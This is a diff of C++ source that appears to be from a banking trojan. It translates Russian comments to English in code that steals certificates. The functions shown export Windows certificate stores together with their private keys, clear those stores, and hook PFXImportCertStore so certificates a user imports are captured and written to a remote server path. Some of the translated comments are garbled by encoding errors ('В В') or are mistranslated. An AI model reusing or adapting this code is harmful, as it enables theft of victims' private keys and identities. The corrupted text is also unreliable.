@@ -51,7 +51,7 @@ static bool exportStore(LPWSTR storeName)
   HANDLE storeHandle = CWA(crypt32, CertOpenSystemStoreW)(NULL, storeName);
   if(storeHandle != NULL)
   {
-    //Получаем кол. сертификатов.
+    //Obtain the count. certificates.
     DWORD certsCount = 0;
     {
       PCCERT_CONTEXT certContext = NULL;
@@ -61,7 +61,7 @@ static bool exportStore(LPWSTR storeName)
     if(certsCount == 0)retVal = true;
     else 
     {
-      //Получаем размер хранилища.
+      //Obtain the size of the store.
       CRYPT_DATA_BLOB pfxBlob;
       pfxBlob.pbData = NULL;
       pfxBlob.cbData = 0;
@@ -72,12 +72,12 @@ static bool exportStore(LPWSTR storeName)
       {
         if(CWA(crypt32, PFXExportCertStoreEx)(storeHandle, &pfxBlob, password, 0, EXPORT_PRIVATE_KEYS) != FALSE)
         {
-          //Делаем имя хранилища в нижний регистр.
+          //Making the store name to lowercase.
           WCHAR storeNameLower[CryptedStrings::len_certstore_export_remote_path * 2];
           Str::_CopyW(storeNameLower, storeName, -1);
           CWA(kernel32, CharLowerW)(storeNameLower);
 
-          //Генерируем имя.
+          //Generate a name.
           WCHAR userName[MAX_PATH];
           WCHAR pfxName[CryptedStrings::len_certstore_export_remote_path * 2];
           SYSTEMTIME st;
@@ -100,14 +100,12 @@ static bool exportStore(LPWSTR storeName)
   return retVal;
 }
 
-/*
-  Очистка хранилища.
+/*В В Cleaning store.
 
-  IN storeName - имя хранилища.
+В В IN storeName - name of the store.
 
-  Return       - true - в случаи успеха,
-                 false - в случаи ошибки.
-*/
+В В Return - true - if successful,
+В В В В В В В В В В В В В В В В В false - if an error occurs.*/
 static bool clearStore(LPWSTR storeName)
 {
   WDEBUG1(WDDT_INFO, "Clearing %s", storeName);
@@ -145,13 +143,13 @@ void * WINAPI CertStoreHook::_hookerPfxImportCertStore(CRYPT_DATA_BLOB *data, LP
   HCERTSTORE certstore = CWA(crypt32, PFXImportCertStore)(data, password, flags);
   if(certstore != NULL && (flags & 0x10000000) == 0 && data && data->cbData > 0 && data->pbData != NULL && Core::isActive())
   {
-    //Генерируем имя.
+    //Generate a name.
     WCHAR userName[MAX_PATH];
     WCHAR pfxName[CryptedStrings::len_certstore_export_remote_path * 2];
     SYSTEMTIME st;
     CWA(kernel32, GetSystemTime)(&st);
       
-    //Пишим сертификат.
+    //Pishim certificate.
     CSTR_GETW(serverPath, certstore_export_remote_path);
     CSTR_GETW(prolog, certstore_export_prolog);
     getUserNameForPath(userName);
